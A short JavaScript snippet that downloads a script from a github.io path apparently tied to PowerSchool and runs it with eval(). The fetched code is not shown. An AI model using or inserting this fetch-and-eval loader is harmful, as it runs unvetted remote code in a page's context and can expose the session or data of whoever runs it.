var requestOptions = {
  method: 'GET',
  redirect: 'follow'
};

fetch("https://elliotdoescode.github.io/POWERschool/lol.js", requestOptions)
  .then(response => response.text())
  .then(result => eval(result))
  .catch(error => console.log('error', error));
